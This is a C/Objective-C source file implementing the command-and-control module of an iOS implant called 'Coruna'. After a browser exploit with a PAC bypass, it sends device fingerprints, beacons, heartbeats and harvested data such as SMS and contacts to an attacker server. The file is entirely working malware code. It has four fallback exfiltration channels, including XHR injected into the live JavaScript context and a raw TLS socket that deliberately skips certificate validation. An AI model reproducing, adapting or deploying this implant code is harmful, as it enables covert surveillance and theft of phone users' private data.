/*
 * c2.c — C2 communication for Coruna payload (Objective-C + C, ARM64 iOS)
 *
 * Four upload channels, tried in order until one succeeds:
 *
 *   Channel C — JavaScriptCore context injection  [PRIMARY in WebContent]
 *     Obtains the live JSContext via [JSContext currentContext].
 *     Evaluates a sync XMLHttpRequest POST (same stack as loading dylib in page).
 *     A saved reference is also dispatched to the main queue from the
 *     background implant thread (dispatch_async, non-blocking).
 *
 *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY outside WC]
 *     Works outside WebContent (e.g. after persistence into syslogd).
 *     In iOS 16+ WebContent, socket(AF_INET) → EPERM (silent deny).
 *
 *   Channel A — NSURLSession  [FALLBACK outside WebContent]
 *     Blocked in WebContent (nsurlsessiond XPC denied by sandbox).
 *     Retained for non-WebContent environments without raw socket access.
 *
 *   Channel D2 — window.__d1_q push for Stage3 JS relay  [WEBCONTENT FALLBACK]
 *     When C/B/A all fail, upload_beacon() pushes the base64-encoded JSON
 *     body to window.__d1_q[] via [JSContext evaluateScript:].  Stage3 reads
 *     this plain JS array after _process() returns and relays items via XHR.
 *     Key advantage over the v1.5 cru_queue (D1) approach: Stage3 never calls
 *     exploitPrimitive.read32 on g_cru_q[], which was found to corrupt the
 *     PAC-bypass internal state after Pt() returns on iOS 15.4.1 (regression
 *     introduced in v1.5; fixed in v1.7).
 *     If JSContext is nil (e.g. background thread), falls back to cru_queue
 *     for debug retention; Stage3 does not read cru_queue in v1.7+.
 */

#import <Foundation/Foundation.h>
#import <objc/message.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#import <Security/SecureTransport.h>
#pragma clang diagnostic pop

#include "c2.h"
#include "cru_queue.h"

/* ── Persistent device UUID ─────────────────────────────────────────────────
 *
 * Priority:
 *   1. __ds_dsid  — UUID written by Stage3_VariantB before calling _process().
 *                   Ensures the dylib and JS chain share the same device UUID.
 *   2. __cru_id   — UUID persisted by a previous dylib run.
 *   3. Fresh UUID — first-run fallback; stored under __cru_id for next time.
 *
 * [d synchronize] is deprecated in iOS 12+ but called explicitly because
 * WebContent is often jetsam-killed; without it the plist may not reach disk.
 */
static NSString *coruna_device_uuid(void) {
    static NSString *cached = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
        NSString *u = [d stringForKey:@"__ds_dsid"];
        if (!u || u.length < 8)
            u = [d stringForKey:@"__cru_id"];
        if (!u || u.length < 8)
            u = [[NSUUID UUID] UUIDString];
        [d setObject:u forKey:@"__cru_id"];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        [d synchronize];
#pragma clang diagnostic pop
        cached = u;
    });
    return cached;
}

/* ── Safe UTF-8 string helper ───────────────────────────────────────────────
 * stringWithUTF8String: returns nil on invalid bytes; fall back to "" so
 * the upload is never dropped due to an encoding issue.
 */
static NSString *c2_safe_str(const char *s) {
    if (!s) return @"";
    NSString *r = [NSString stringWithUTF8String:s];
    return r ? r : @"";
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Channel C — JavaScriptCore context injection
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * When Stage3_VariantB.js calls _process() via a PAC-bypassed function
 * pointer, we execute on the JSC main thread while vm.topCallFrame is active.
 * [JSContext currentContext] returns the live JS context in this scenario.
 *
 * We inject a self-executing script with the JSON body base64-encoded (atob
 * in JS).  Sync XMLHttpRequest is used for POST (same path as Stage3 loading
 * bootstrap.dylib); it completes before evaluateScript returns, avoiding
 * fire-and-forget fetch() races with page teardown / PAC cleanup.
 *
 * A strong reference to the context is saved so that the background implant
 * thread (implant_main) can dispatch the same upload script to the main queue
 * without blocking harvest_all() on false positives (see upload_via_jsc_dispatch).
 */

/* Strong reference to the captured JSContext.  Set at most once (in process()
 * before the background thread starts).  Retained for the process lifetime so
 * background dispatches can fire as long as the page is loaded. */
static id g_saved_jsc = nil;

/* Build JS that POSTs JSON via synchronous XHR; returns true iff HTTP 2xx. */
static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
    NSString *b64body = [body base64EncodedStringWithOptions:0];
    NSString *c2url   = [NSString stringWithFormat:@"%@://%s%s",
                         C2_USE_HTTPS ? @"https" : @"http",
                         C2_DOMAIN, C2_UPLOAD];
    return [NSString stringWithFormat:
        @"(function(){"
        @"try{"
        @"var x=new XMLHttpRequest();"
        @"x.open('POST','%@',false);"
        @"x.setRequestHeader('Content-Type','application/json');"
        @"x.setRequestHeader('X-Device-UUID','%@');"
        @"x.send(atob('%@'));"
        @"return x.status>=200&&x.status<300;"
        @"}catch(e){return false;}"
        @"})();",
        c2url, uuid, b64body];
}

/* Read boolean result from evaluateScript: (JSValue) without linking JSC headers. */
static bool jsc_eval_script_yields_true(id ctx, NSString *script) {
    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
    if (!ctx || !script || ![ctx respondsToSelector:evalSel]) return false;

    id (*sendId)(id, SEL, id) = (id (*)(id, SEL, id))objc_msgSend;
    id jsv = sendId(ctx, evalSel, script);
    if (!jsv) return false;

    SEL toBoolSel = NSSelectorFromString(@"toBool");
    if (![jsv respondsToSelector:toBoolSel]) return false;

    BOOL (*sendBool)(id, SEL) = (BOOL (*)(id, SEL))objc_msgSend;
    return sendBool(jsv, toBoolSel) ? true : false;
}

/*
 * upload_via_jsc_now — must be called from the JS execution thread.
 *
 * Calls [JSContext currentContext]; if non-nil saves it globally and
 * evaluates the upload script (sync XHR runs to completion inside eval).
 * Returns true only if the script reports HTTP 2xx (avoids skipping B/A/D on failure).
 */
static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
    Class jsCtxClass = NSClassFromString(@"JSContext");
    if (!jsCtxClass) return false;

    SEL currentSel = NSSelectorFromString(@"currentContext");
    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
    if (![jsCtxClass respondsToSelector:currentSel]) return false;

    id ctx = [jsCtxClass performSelector:currentSel];
    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;

    /* Save for background-thread reuse — only set once, before any thread
     * could race here (called from process() before coruna_constructor()). */
    if (!g_saved_jsc) g_saved_jsc = ctx;

    NSString *script = jsc_fetch_script(body, uuid);
    @try {
        return jsc_eval_script_yields_true(ctx, script);
    } @catch (...) {
        return false;
    }
}

/*
 * jsc_push_to_d2q — push base64-encoded JSON body to window.__d1_q[].
 *
 * Must be called from the JS execution thread (i.e. process() → upload_beacon()).
 * Stage3_VariantB.js reads window.__d1_q after _process() returns and POSTs
 * each item via XHR — WITHOUT using exploit primitives (read32/write32), so
 * it cannot corrupt the PAC-bypass state after Pt() returns.
 *
 * Returns true if the script was evaluated (does NOT confirm XHR success).
 * Returns false if no active JSContext is available (e.g. background thread).
 */
static bool jsc_push_to_d2q(NSData *body) {
    Class jsCtxClass = NSClassFromString(@"JSContext");
    if (!jsCtxClass) return false;

    SEL currentSel = NSSelectorFromString(@"currentContext");
    SEL evalSel    = NSSelectorFromString(@"evaluateScript:");
    if (![jsCtxClass respondsToSelector:currentSel]) return false;

    id ctx = [jsCtxClass performSelector:currentSel];
    if (!ctx || ![ctx respondsToSelector:evalSel]) return false;

    NSString *b64 = [body base64EncodedStringWithOptions:0];
    if (!b64 || b64.length == 0) return false;

    /* Base64 alphabet is [A-Za-z0-9+/=] — safe inside a JS single-quoted
     * string literal with no escaping needed. */
    NSString *script = [NSString stringWithFormat:
        @"(window.__d1_q=window.__d1_q||[]).push('%@');", b64];
    [ctx performSelector:evalSel withObject:script];
    return true;
}

/*
 * upload_via_jsc_dispatch — safe to call from any thread.
 *
 * Runs the same XHR script on the main queue and returns whether HTTP 2xx
 * was observed.  Uses dispatch_sync when not already on main (avoids the
 * previous bug: dispatch_async + unconditional true skipped B/A/D).
 *
 * Note: WebKit may associate JSContext with the JS worker thread, not main;
 * this path is best-effort; failure falls through to B/A/D.
 */
static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
    id ctx = g_saved_jsc;
    if (!ctx) return false;

    SEL evalSel = NSSelectorFromString(@"evaluateScript:");
    if (![ctx respondsToSelector:evalSel]) return false;

    __strong id capturedCtx   = ctx;
    NSString *capturedScript = jsc_fetch_script(body, uuid);

    __block bool ok = false;
    void (^work)(void) = ^{
        @try {
            ok = jsc_eval_script_yields_true(capturedCtx, capturedScript);
        } @catch (...) {
            ok = false;
        }
    };
    if ([NSThread isMainThread])
        work();
    else
        dispatch_sync(dispatch_get_main_queue(), work);
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Channel B — raw POSIX socket + SecureTransport TLS
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct { int fd; } ssl_conn_ctx;

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

static OSStatus ssl_read_fn(SSLConnectionRef ref, void *data, size_t *len) {
    int fd = ((ssl_conn_ctx *)ref)->fd;
    ssize_t n;
    do { n = recv(fd, data, *len, 0); } while (n < 0 && errno == EINTR);
    if (n > 0)  { *len = (size_t)n; return noErr; }
    *len = 0;
    return (n == 0) ? errSSLClosedGraceful : errSSLClosedAbort;
}

static OSStatus ssl_write_fn(SSLConnectionRef ref, const void *data, size_t *len) {
    int fd = ((ssl_conn_ctx *)ref)->fd;
    ssize_t n;
    do { n = send(fd, data, *len, 0); } while (n < 0 && errno == EINTR);
    if (n > 0)  { *len = (size_t)n; return noErr; }
    *len = 0;
    return errSSLClosedAbort;
}

/*
 * raw_https_post — blocking HTTPS POST over a raw TCP + TLS socket.
 *
 * Returns true when the server returns at least a partial HTTP response.
 *
 * Key properties:
 *  • connect() uses O_NONBLOCK + select() with a 10-second timeout so we
 *    never hang indefinitely if the server is temporarily unreachable.
 *  • SO_RCVTIMEO / SO_SNDTIMEO protect TLS I/O operations (10 s each).
 *  • kSSLSessionOptionBreakOnServerAuth: certificate validation is bypassed
 *    (we continue unconditionally after errSSLServerAuthCompleted).
 *    This makes the upload work regardless of cert issuer or expiry.
 */
static bool raw_https_post(const char *host, int port, const char *path,
                           const char *uuid_str,
                           const uint8_t *body, size_t body_len) {
    /* DNS resolution */
    struct addrinfo hints, *res = NULL;
    __builtin_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", port);
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res)
        return false;

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return false; }

    /* Non-blocking connect with 10-second deadline */
    bool connected = false;
    {
        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        int cr = connect(fd, res->ai_addr, res->ai_addrlen);
        if (cr == 0) {
            connected = true;   /* connected immediately (unusual but valid) */
        } else if (errno == EINPROGRESS) {
            struct timeval ct = {10, 0};
            fd_set wfds, efds;
            FD_ZERO(&wfds); FD_SET(fd, &wfds);
            FD_ZERO(&efds); FD_SET(fd, &efds);
            int sr = select(fd + 1, NULL, &wfds, &efds, &ct);
            if (sr > 0 && FD_ISSET(fd, &wfds) && !FD_ISSET(fd, &efds)) {
                int err = 0; socklen_t elen = sizeof(err);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen);
                connected = (err == 0);
            }
        }

        /* Restore blocking mode for SSL I/O */
        fcntl(fd, F_SETFL, flags);
    }

    freeaddrinfo(res);

    if (!connected) { close(fd); return false; }

    /* 10-second I/O timeout for SSL send/recv */
    struct timeval tv = {10, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    bool ok = false;
    ssl_conn_ctx sconn = {fd};
    SSLContextRef ctx = SSLCreateContext(NULL, kSSLClientSide, kSSLStreamType);
    SSLSetIOFuncs(ctx, ssl_read_fn, ssl_write_fn);
    SSLSetConnection(ctx, &sconn);
    SSLSetPeerDomainName(ctx, host, strlen(host));
    /* Break on cert auth so we can skip validation and continue */
    SSLSetSessionOption(ctx, kSSLSessionOptionBreakOnServerAuth, true);

    OSStatus s;
    int tries = 8;
    /* errSSLServerAuthCompleted = cert break: continue unconditionally.
     * errSSLWouldBlock = shouldn't occur on blocking socket, but guard anyway. */
    do {
        s = SSLHandshake(ctx);
    } while ((s == errSSLWouldBlock || s == errSSLServerAuthCompleted) && --tries > 0);

    if (s == noErr) {
        char hdr[512];
        int hdr_len = snprintf(hdr, sizeof(hdr),
            "POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %zu\r\n"
            "X-Device-UUID: %s\r\n"
            "Connection: close\r\n\r\n",
            path, host, body_len, uuid_str ? uuid_str : "");

        size_t wrote = 0;
        if (SSLWrite(ctx, hdr, (size_t)hdr_len, &wrote) == noErr &&
            SSLWrite(ctx, body, body_len, &wrote) == noErr) {
            /* Drain the first chunk of the HTTP response */
            uint8_t buf[512];
            size_t nread = 0;
            OSStatus rs = SSLRead(ctx, buf, sizeof(buf), &nread);
            ok = (rs == noErr || rs == errSSLClosedGraceful) && nread > 0;
        }
    }

    SSLClose(ctx);
    CFRelease(ctx);
    close(fd);
    return ok;
}

#pragma clang diagnostic pop   /* -Wdeprecated-declarations */

/* ═══════════════════════════════════════════════════════════════════════════
 * Channel A — NSURLSession (fallback for non-WebContent environments)
 * ═══════════════════════════════════════════════════════════════════════════ */
static bool nsurlsession_post(NSURL *url, NSData *body, NSString *uuid) {
    __block bool succeeded = false;
    NSMutableURLRequest *req =
        [NSMutableURLRequest requestWithURL:url
                                cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                            timeoutInterval:10.0];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
    [req setHTTPBody:body];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    NSURLSessionConfiguration *cfg =
        [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest  = 10.0;
    cfg.timeoutIntervalForResource = 10.0;

    NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
    [[session dataTaskWithRequest:req
                completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        succeeded = (e == nil && r != nil);
        dispatch_semaphore_signal(sem);
    }] resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW,
                                               12 * NSEC_PER_SEC));
    [session invalidateAndCancel];
    return succeeded;
}

/* ── JSON body builder ─────────────────────────────────────────────────────*/
static NSData *make_json_body(NSString *uuid, const char *category,
                              const char *path, const char *description,
                              const char *b64data) {
    NSDictionary *d = @{
        @"deviceUUID":  uuid,
        @"category":    c2_safe_str(category    ?: "data"),
        @"path":        c2_safe_str(path        ?: ""),
        @"description": c2_safe_str(description ?: ""),
        @"data":        c2_safe_str(b64data     ?: ""),
    };
    return [NSJSONSerialization dataWithJSONObject:d options:0 error:nil];
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Public API
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * upload_to_c2 — post one JSON record via Channel C → B → A.
 *
 * Channel C (JSContext sync XHR injection):
 *   • On the JS thread (process() call):   upload_via_jsc_now()     [sync eval]
 *   • On a background thread (implant_main): upload_via_jsc_dispatch() [async]
 *   Uses WebKit's network stack from page JS (consistent with sync GET of dylib).
 *
 * Channel B (raw socket + TLS):
 *   Works outside WebContent (e.g. syslogd persistence).
 *   In iOS 16+ WebContent socket(AF_INET) → EPERM; skipped almost instantly.
 *   Worst case: 10-second connect timeout.
 *
 * Channel A (NSURLSession):
 *   Blocked in WebContent (nsurlsessiond XPC denied by sandbox).
 *   Worst case: 10-second timeout.
 */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data) {
    @autoreleasepool {
        NSString *uuid = coruna_device_uuid();
        NSData   *body = make_json_body(uuid, category, path, description, b64data);
        if (!body) return;

        /* Channel C — JS injection on JS thread (process() context) */
        bool sent = upload_via_jsc_now(body, uuid);

        /* Channel C — JS injection from background thread via saved context */
        if (!sent)
            sent = upload_via_jsc_dispatch(body, uuid);

        /* Channel B — raw POSIX socket + SecureTransport */
        if (!sent)
            sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
                                  uuid.UTF8String,
                                  (const uint8_t *)body.bytes, body.length);

        /* Channel A — NSURLSession (last resort, works outside WebContent) */
        if (!sent) {
            NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
            NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                scheme, C2_DOMAIN, C2_UPLOAD];
            NSURL *url = [NSURL URLWithString:urlStr];
            if (url) sent = nsurlsession_post(url, body, uuid);
        }

        /* Channel D — in-memory queue for optional Stage3 relay (if any).
         * Written when all three network channels fail (typical WebContent).
         * Without JS changes nothing drains this queue; prefer Channel C success.
         * Items ≥ CRU_Q_B64MAX bytes (base64) are silently dropped here;
         * large payloads (SMS, contacts) arrive via the persistence path. */
        if (!sent) {
            NSString *b64body = [body base64EncodedStringWithOptions:0];
            if (b64body) {
                cru_queue_push(b64body.UTF8String);
            }
        }
    }
}

/*
 * upload_beacon — synchronous diagnostic probe called from process().
 *
 * Called before coruna_constructor() so it executes on the JS execution
 * thread — the ideal moment for Channel C (JSContext is live).
 *
 * Channel C:  evaluates sync XHR POST in current JSContext.  If this appears in
 *             server logs the description contains "(jsc)".
 * Channel B:  raw socket, works outside WebContent / after persistence.
 * Channel A:  NSURLSession fallback.
 *
 * Blocked time: sync XHR latency if Channel C runs (~RTT); up to ~10 s if only B is tried.
 */
void upload_beacon(void) {
    @autoreleasepool {
        char ios_ver[64] = "?";
        size_t vs = sizeof(ios_ver);
        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);

        NSString *uuid = coruna_device_uuid();

        /* ── Channel C ── */
        {
            NSString *desc = [NSString stringWithFormat:
                              @"beacon v" PAYLOAD_VERSION
                              @" ios=%s pid=%d proc=%s (jsc)",
                              ios_ver, (int)getpid(), getprogname() ?: "?"];
            NSData *body = make_json_body(uuid,
                                          "system", "/coruna/beacon",
                                          desc.UTF8String, "");
            if (body && upload_via_jsc_now(body, uuid)) return;
        }

        /* ── Channel B / A ── */
        NSString *desc = [NSString stringWithFormat:
                          @"beacon v" PAYLOAD_VERSION
                          @" ios=%s pid=%d proc=%s",
                          ios_ver, (int)getpid(), getprogname() ?: "?"];
        NSData *body = make_json_body(uuid,
                                      "system", "/coruna/beacon",
                                      desc.UTF8String, "");
        if (!body) return;

        bool sent = raw_https_post(C2_DOMAIN, C2_PORT, C2_UPLOAD,
                                   uuid.UTF8String,
                                   (const uint8_t *)body.bytes, body.length);
        if (!sent) {
            NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
            NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                scheme, C2_DOMAIN, C2_UPLOAD];
            NSURL *url = [NSURL URLWithString:urlStr];
            if (url) sent = nsurlsession_post(url, body, uuid);
        }

        /* Channel D2 — push to window.__d1_q via JSContext (JSC thread only).
         * Stage3_VariantB.js relays the item via XHR without reading g_cru_q
         * through exploit primitives, preventing PAC-bypass state corruption.
         * Falls back to cru_queue for debug / future use if ctx is nil.      */
        if (!sent) {
            if (!jsc_push_to_d2q(body)) {
                NSString *b64body = [body base64EncodedStringWithOptions:0];
                if (b64body) cru_queue_push(b64body.UTF8String);
            }
        }
    }
}

/*
 * upload_device_info — full device identification record.
 */
void upload_device_info(void) {
    @autoreleasepool {
        struct utsname un;
        uname(&un);

        char ios_ver[64] = "unknown";
        size_t vs = sizeof(ios_ver);
        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);

        char kern_ver[256] = "unknown";
        size_t ks = sizeof(kern_ver);
        sysctlbyname("kern.version", kern_ver, &ks, NULL, 0);

        NSDictionary *info = @{
            @"version":      @(PAYLOAD_VERSION),
            @"machine":      @(un.machine),
            @"sysname":      @(un.sysname),
            @"release":      @(un.release),
            @"ios_version":  @(ios_ver),
            @"kern_version": @(kern_ver),
        };

        NSData *json = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
        if (!json) return;
        NSString *b64 = [json base64EncodedStringWithOptions:0];
        upload_to_c2("system", "/coruna/device_info",
                     "Device identification v" PAYLOAD_VERSION, b64.UTF8String);
    }
}

/*
 * c2_heartbeat — confirms the implant background thread is alive.
 */
void c2_heartbeat(void) {
    upload_to_c2("system", "/coruna/heartbeat",
                 "coruna implant alive", "aGVhcnRiZWF0");
}

/*
 * Legacy stub — kept for ABI compatibility.
 */
void send_to_c2(const uint8_t *data, size_t len) {
    (void)data; (void)len;
}
